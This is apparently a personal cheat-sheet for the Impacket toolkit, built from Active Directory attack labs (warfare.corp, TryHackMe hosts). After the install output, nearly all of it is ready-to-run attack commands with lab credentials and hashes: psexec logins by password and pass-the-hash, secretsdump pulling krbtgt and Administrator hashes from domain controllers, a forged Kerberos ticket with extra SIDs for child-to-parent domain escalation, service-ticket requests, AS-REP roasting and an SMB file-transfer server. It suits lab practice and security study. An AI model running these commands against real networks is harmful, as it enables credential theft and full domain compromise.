---
title: "impacket"
tags:
  - fetus
---
## installation:
```sh
pipx install impacket
```
- output should look like this after successful installation:
```sh fold title:"installed"
  installed package impacket 0.12.0, installed using Python 3.13.7
  These apps are now globally available
    - DumpNTLMInfo.py
    - Get-GPPPassword.py
    - GetADComputers.py
    - GetADUsers.py
    - GetLAPSPassword.py
    - GetNPUsers.py
    - GetUserSPNs.py
    - addcomputer.py
    - atexec.py
    - changepasswd.py
    - dacledit.py
    - dcomexec.py
    - describeTicket.py
    - dpapi.py
    - esentutl.py
    - exchanger.py
    - findDelegation.py
    - getArch.py
    - getPac.py
    - getST.py
    - getTGT.py
    - goldenPac.py
    - karmaSMB.py
    - keylistattack.py
    - kintercept.py
    - lookupsid.py
    - machine_role.py
    - mimikatz.py
    - mqtt_check.py
    - mssqlclient.py
    - mssqlinstance.py
    - net.py
    - netview.py
    - ntfs-read.py
    - ntlmrelayx.py
    - owneredit.py
    - ping.py
    - ping6.py
    - psexec.py
    - raiseChild.py
    - rbcd.py
    - rdp_check.py
    - reg.py
    - registry-read.py
    - rpcdump.py
    - rpcmap.py
    - sambaPipe.py
    - samrdump.py
    - secretsdump.py
    - services.py
    - smbclient.py
    - smbexec.py
    - smbserver.py
    - sniff.py
    - sniffer.py
    - split.py
    - ticketConverter.py
    - ticketer.py
    - tstool.py
    - wmiexec.py
    - wmipersist.py
    - wmiquery.py
done! ✨ 🌟 ✨
```
## usage:
### psexec.py:
- metasploit module:
```sh
use exploit/windows/smb/psexec
```

- manual commands
```sh
psexec.py 'child/john:User1@#$%6@192.168.98.30'
```

```sh
psexec.py 'child/corpmngr:User4&*&*@child.warfare.corp'
```

```sh
psexec.py -debug 'warfare/Administrator@dc01.warfare.corp' -hashes  
aad3b435b51404eeaad3b435b51404ee:a2f7b77b62cd97161e18be2ffcfdfd60
```
- can do `-hashes hash` after `'child\uname@domain` if no actual creds but do have hash

```sh
psexec.py alice@TARGET_IP -k -no-pass -dc-ip 10.0.0.5
```

### secretsdump.py:
```sh
secretsdump.py THM-AD/backup:backup2517860@10.201.91.87 -dc-ip 10.201.91.87
```

```sh
secretsdump.py -debug child/corpmngr:'User4&*&*'@cdc.child.warfare.corp -just-dc-user 'child\krbtgt'
```

```sh
secretsdump.py -k -no-pass dc01.warfare.corp -just-dc-user 'warfare\Administrator' -debug
```
### lookupsid.py:
```sh
lookupsid.py child/corpmngr:'User4&*&*'@child.warfare.corp  
```

```sh
lookupsid.py child/corpmngr:'User4&*&*'@warfare.corp  
```
### ticketer.py:
```sh
ticketer.py -domain child.warfare.corp -aesKey ad8c273289e4c511b4363c43c08f9a5aff06f8fe002c10ab1031da11152611b2 -domain-sid S-1-5-21-3754860944-83624914-1883974761 -groups 516 -user-id 1106 -extra-sid S-1-5-21-3375883379-808943238-3239386119-516,S-1-5-9 'corpmngr'
```
- set ccache env var after (get variable input from "saving ticket in X" at the end where X is the value of env var): 
```sh
export KRB5CCNAME=corpmngr.ccache
```
### getST.py 
```sh
getST.py -spn 'CIFS/dc01.warfare.corp' -k -no-pass child.warfare.corp/corpmngr -debug
```
- update ccache env var again
```sh
export KRB5CCNAME=corpmngr@CIFS_dc01.warfare.corp@WARFARE.CORP.ccache
```
### GetNPUsers.py
```sh
GetNPUsers.py THM-AD/svc-admin -no-pass -dc-ip 10.201.88.85
```
## smbserver.py
```sh
smbserver.py root .
```

```sh
copy \\10.14.110.172\LocalUNAME\FileToTransfer C:\PrivEsc\OutputName
```
